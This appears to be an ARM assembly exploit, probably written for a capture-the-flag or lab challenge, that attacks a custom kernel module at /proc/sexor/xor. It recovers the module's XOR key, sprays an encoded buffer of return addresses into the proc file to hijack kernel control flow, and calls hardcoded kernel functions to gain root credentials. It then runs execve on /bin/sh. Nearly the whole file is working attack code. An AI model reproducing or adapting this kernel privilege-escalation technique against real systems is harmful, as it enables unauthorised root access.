.section .text
.global _start
.code 32

_start:
    sub sp, #0x3000

    ldr r0, =bonjour
    mov r1, #8
    bl write_r0_to_stdout

    ldr r0, =file
    bl open_r0
    str r0, [sp]

    bl write_char_r0_to_stdout

    ldr r0, [sp]
    cmp r0, #-1
    ldrle r0, =error
    movle r1, #12
    blle write_r0_to_stdout
    blle exit

    bl get_key_from_r0


    ldr r0, =test_xor_inf
    add r1, sp, #8
    mov r2, #82
    bl xor_r0_to_r1_with_key

    add r0, sp, #8
    mov r1, #82
    ldr r2, [sp]
    bl write_r0_to_r2


    ldr r0, =test_xor_sup
    add r1, sp, #8
    movw r2, #545
    bl xor_r0_to_r1_with_key

    add r0, sp, #8
    movw r1, #545
    ldr r2, [sp]
    bl write_r0_to_r2


    ldr r0, =user_branch
    bl exec_at_address

    ldr r0, =revoir
    mov r1, #10
    bl write_r0_to_stdout

    bl exit


exec_at_address:
    mov r6, r0

    movw r1, #0x1bf8
    str r1, [sp, #4]

    add r0, sp, #8
    mov r1, r0
    ldr r2, [sp, #4]
    add r1, r1, r2
    sub r1, #1
    mov r2, r6

    bl fill_buffer_start_end_r2

    add r0, sp, #8
    mov r1, r0
    ldr r2, [sp, #4]
    bl xor_r0_to_r1_with_key

    add r0, sp, #8
    ldr r1, [sp, #4]
    bl write_r0_to_stdout

    ldr r0, [sp]
    add r1, sp, #8
    ldr r2, [sp, #4]
    mov r7, #4
    swi 0

    mov r7, #0
    swi 0

    movw r0, #0x732F
    movt r0, #0x68
    push {r0}
    movw r0, #0x622f
    movt r0, #0x6e69
    push {r0}
    mov r0, sp
    mov r1, #0
    push {r1}
    push {r0}
    mov r1, sp
    mov r2, #0
    mov r7, #0xb
    swi 0

write_r0_to_stdout:
    push {lr}
    mov r7, #4
    mov r2, r1
    mov r1, r0
    mov r0, #1
    swi 0

    pop {pc}

write_char_r0_to_stdout:
    mov r7, #4
    mov r2, #1
    mov r1, r0
    add r1, #49
    push {r1}
    mov r1, sp
    mov r0, #1
    swi 0
    pop {r1}

    ldr r0, =return
    mov r1, #1
    mov r5, lr
    bl write_r0_to_stdout

    mov pc, r5

user_branch:
    push {lr}
    ldr r0, =victory
    mov r1, #13
    bl write_r0_to_stdout

    mov r0, #0
    movw r1, #0x2464
    movt r1, #0x8004
    blx r1

    movw r1, #0x2148
    movt r1, #0x8004
    blx r1

    pop {pc}

fill_buffer_start_end_r2:
    cmp r0, r1
    str r2, [r0, #0]
    movge pc, lr
    add r0, #4
    ble fill_buffer_start_end_r2

exit:
    mov r7, #1
    swi 0

open_r0:
    mov r1, #0002
    mov r2, #0
    mov r7, #5
    swi 0
    mov pc, lr

write_r0_to_r2:
    mov r7, #4
    mov r3, r2
    mov r2, r1
    mov r1, r0
    mov r0, r3
    swi 0

    push {lr}
    bl write_char_r0_to_stdout
    pop {pc}



read_r0_from_r2:
    mov r7, #3
    mov r3, r2
    mov r2, r1
    mov r1, r0
    mov r0, r3
    swi 0
    mov pc, lr

get_key_from_r0:
    push {lr}
    push {r0}

    mov r1, #0x200
    mov r2, r0
    ldr r0, =key
    bl write_r0_to_r2

    mov r1, #0x200
    pop {r2}
    ldr r0, =key
    bl read_r0_from_r2

    pop {pc}

xor_r0_to_r1_with_key:
    ldr r3, =key
    mov r4, #0
    mov r5, #0
    .loop_xor:
        cmp r4, r2
        moveq pc, lr
        ldrb r6, [r0, r4]
        ldrb r7, [r3, r5]
        eor r6, r6, r7
        strb r6, [r1, r4]
        add r4, #1
        add r5, #1
        cmp r5, #0x200
        moveq r5, #0
        b .loop_xor

.lcomm key, 0x200

.data
test_xor_inf:
    .ascii "AHAHAHAHAHAH le xor ca marche bien on va voir si pour plus de 512 et moins de 512\x00"
test_xor_sup:
    .ascii "AHAHAHAHAHAH le xor ca marche bien on va voir si pour plus de 512 et moins de 512 512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512 512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512 5125125125125125125125125125125125125125125125125125125125112512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512512\x00"
file:
    .ascii "/proc/sexor/xor\x00"
bonjour:
    .ascii "Bonjour\n"
revoir:
    .ascii "Au revoir\n"
error:
    .ascii "Erreur open\n"
return:
    .ascii "\n"
victory:
    .ascii "Victory done !\n"
bin_sh:
    .ascii "/bin/sh\x00"
